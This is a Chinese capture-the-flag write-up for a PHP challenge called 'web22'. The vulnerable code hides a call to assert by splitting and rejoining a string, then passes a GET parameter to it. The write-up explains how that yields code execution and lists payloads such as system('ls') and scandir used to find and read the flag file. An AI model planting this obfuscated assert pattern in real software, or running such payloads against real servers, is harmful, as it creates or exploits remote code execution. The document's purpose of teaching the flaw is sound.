# web22

![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618658381493-image-20210118192123332.png)

题目描述:

![image-20210118192305288](D:\ebook\markdown\image/image-20210118192305288.png)

```php
$poc="a#s#s#e#r#t";
$poc_1=explode("#", $poc);
$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];
$poc_2($_GET['s']);
```

经过变量$poc_1的分割还有变量$poc_2的拼接之后变量$poc_2的值是assert

这个函数是检查一个[断言](https://www.php.net/manual/zh/regexp.reference.assertions.php)是否为False

然后接受一个参数为s的GET请求

这里就牵扯到assert这个参数的漏洞了

代码执行的漏洞

assert会在检查指定的值并在结果为FALSE时采取一些行动，如果这个值时字符串，就会被assert当作php代码执行

![image-20210118200007585](D:\ebook\markdown\image/image-20210118200007585.png)![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618658410555-image-20210118202613175.png)

可以执行phpinfo()

本来phpinfo要执行完整的是phpinfo();

这里少了一个 **；**

assert判断是False

所以就直接执行了

之后就判断flag在某个文件里

所以可以去执行查看目录的php代码

```php
system('ls')
print_r(scandir('./'))
print_r(glob(*.*))
var_dump(scandir('./'))
print_r(glob(*.*))
```

![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618658471432-image-20210118203416888.png)

![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618658493997-image-20210118203431434.png)

这些都可以

得到flag的文件之后

因为是txt文件

所以可以直接查看

![](https://bulabula-1305079562.cos.ap-guangzhou.myqcloud.com/img/1618658510950-image-20210118203540127.png)